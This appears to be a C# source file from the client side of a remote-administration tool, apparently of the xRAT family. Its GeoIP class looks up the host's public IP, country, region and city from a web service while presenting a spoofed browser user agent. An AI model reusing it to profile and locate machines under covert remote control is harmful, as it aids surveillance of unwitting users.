using System.IO;
using System.Net;
using System.Xml;

namespace xClient.Core.Information
{
    internal class GeoIP
    {
        public string WanIp { get; private set; }
        public string Country { get; private set; }
        public string CountryCode { get; private set; }
        public string Region { get; private set; }
        public string City { get; private set; }

        public GeoIP()
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest) WebRequest.Create("https://freegeoip.net/xml/");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0";
                request.Proxy = null;
                request.Timeout = 5000;

                using (HttpWebResponse response = (HttpWebResponse) request.GetResponse())
                {
                    using (Stream dataStream = response.GetResponseStream())
                    {
                        using (StreamReader reader = new StreamReader(dataStream))
                        {
                            string responseString = reader.ReadToEnd();

                            XmlDocument doc = new XmlDocument();
                            doc.LoadXml(responseString);

                            WanIp = doc.SelectSingleNode("Response//IP").InnerXml;
                            Country = (!string.IsNullOrEmpty(doc.SelectSingleNode("Response//CountryName").InnerXml))
                                ? doc.SelectSingleNode("Response//CountryName").InnerXml
                                : "Unknown";
                            CountryCode =
                                (!string.IsNullOrEmpty(doc.SelectSingleNode("Response//CountryCode").InnerXml))
                                    ? doc.SelectSingleNode("Response//CountryCode").InnerXml
                                    : "-";
                            Region = (!string.IsNullOrEmpty(doc.SelectSingleNode("Response//RegionName").InnerXml))
                                ? doc.SelectSingleNode("Response//RegionName").InnerXml
                                : "Unknown";
                            City = (!string.IsNullOrEmpty(doc.SelectSingleNode("Response//City").InnerXml))
                                ? doc.SelectSingleNode("Response//City").InnerXml
                                : "Unknown";
                        }
                    }
                }
            }
            catch
            {
                WanIp = "-";
                Country = "Unknown";
                CountryCode = "-";
                Region = "Unknown";
                City = "Unknown";
            }
        }
    }
}